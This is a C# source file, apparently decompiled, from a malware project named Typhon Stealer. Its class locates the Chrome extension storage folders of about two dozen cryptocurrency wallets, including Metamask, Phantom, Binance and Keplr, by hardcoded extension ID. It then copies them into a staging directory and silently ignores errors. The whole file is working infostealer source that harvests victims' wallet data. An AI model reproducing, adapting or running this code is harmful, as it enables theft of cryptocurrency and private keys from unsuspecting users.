using System;
using System.Collections.Generic;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.CryptoApps
{
	// Token: 0x02000023 RID: 35
	internal class ChromeCryptoExtensionStealer
	{
		// Token: 0x06000091 RID: 145 RVA: 0x0000621C File Offset: 0x0000441C
		public static void GetChromeWallets(string sSaveDir)
		{
			try
			{
				Directory.CreateDirectory(sSaveDir);
				foreach (string[] array in ChromeCryptoExtensionStealer.ChromeWalletsDirectories)
				{
					ChromeCryptoExtensionStealer.CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
				}
				if (Directory.GetFiles(sSaveDir).Length == 0 && Directory.GetDirectories(sSaveDir).Length == 0)
				{
					IOHelper.DeleteDirectory(sSaveDir, false);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x000062A4 File Offset: 0x000044A4
		private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
		{
			string copyDirPath = Path.Combine(sSaveDir, sWalletName);
			if (!Directory.Exists(sWalletDir))
			{
				return;
			}
			IOHelper.CopyDirectory(sWalletDir, copyDirPath);
		}

		// Token: 0x04000042 RID: 66
		private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Chrome_Binance",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
			},
			new string[]
			{
				"Chrome_Bitapp",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
			},
			new string[]
			{
				"Chrome_Coin98",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
			},
			new string[]
			{
				"Chrome_Equal",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
			},
			new string[]
			{
				"Chrome_Guild",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
			},
			new string[]
			{
				"Chrome_Iconex",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
			},
			new string[]
			{
				"Chrome_Math",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
			},
			new string[]
			{
				"Chrome_Mobox",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
			},
			new string[]
			{
				"Chrome_Phantom",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
			},
			new string[]
			{
				"Chrome_Tron",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
			},
			new string[]
			{
				"Chrome_XinPay",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
			},
			new string[]
			{
				"Chrome_Ton",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
			},
			new string[]
			{
				"Chrome_Metamask",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
			},
			new string[]
			{
				"Chrome_Sollet",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
			},
			new string[]
			{
				"Chrome_Slope",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
			},
			new string[]
			{
				"Chrome_Starcoin",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
			},
			new string[]
			{
				"Chrome_Swash",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
			},
			new string[]
			{
				"Chrome_Finnie",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
			},
			new string[]
			{
				"Chrome_Keplr",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
			},
			new string[]
			{
				"Chrome_Crocobit",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
			},
			new string[]
			{
				"Chrome_Oxygen",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
			},
			new string[]
			{
				"Chrome_Nifty",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
			},
			new string[]
			{
				"Chrome_Liquality",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
			}
		};
	}
}
